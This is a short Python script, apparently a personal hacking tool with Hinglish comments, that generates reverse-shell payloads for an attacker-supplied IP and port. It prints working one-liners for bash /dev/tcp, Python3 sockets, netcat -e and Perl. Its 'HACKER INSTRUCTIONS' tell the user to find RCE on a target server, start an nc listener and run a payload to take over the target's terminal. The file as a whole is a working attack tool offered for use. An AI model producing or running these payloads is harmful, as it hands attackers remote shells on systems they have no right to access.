import sys

def generate_shells(ip, port):
    print(f"\n[*] Bhai, generating Reverse Shell payloads for Target -> LHOST:{ip} LPORT:{port}")
    print("[*] Your Job: Target server par RCE dhoondho aur inmein se koi ek command chala do!\n")
    print("==================================================")
    
    # 1. The Classic Bash Shell (Sabse zyada use hota hai Linux targets par)
    bash_shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    print("[+] Bash Reverse Shell:")
    print(f"    {bash_shell}\n")
    
    # 2. Python 3 Shell (Agar target par Python installed hai)
    python_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    print("[+] Python3 Reverse Shell:")
    print(f"    {python_shell}\n")
    
    # 3. Netcat (nc) Shell (Old school hacking tool)
    nc_shell = f"nc -e /bin/sh {ip} {port}"
    print("[+] Netcat (nc) Shell:")
    print(f"    {nc_shell}\n")
    
    # 4. Perl Shell (Agar server pe bash ya python block ho)
    perl_shell = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    print("[+] Perl Reverse Shell:")
    print(f"    {perl_shell}\n")
    
    print("==================================================")
    print("\n[*] HACKER INSTRUCTIONS (Listener Setup):")
    print(f"    1. Naya terminal open karo apne Arch Linux par.")
    print(f"    2. Yeh command run karke wait karo:  nc -lvnp {port}")
    print(f"    3. Upar wala koi bhi payload target par execute karo.")
    print(f"    4. BOOM! Target ka terminal tumhare paas hoga! 🎯")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 rev_gen.py <Your_IP_Address> <Listening_Port>")
        print("Example: python3 rev_gen.py 192.168.1.100 4444")
        sys.exit(1)
        
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    generate_shells(lhost, lport)
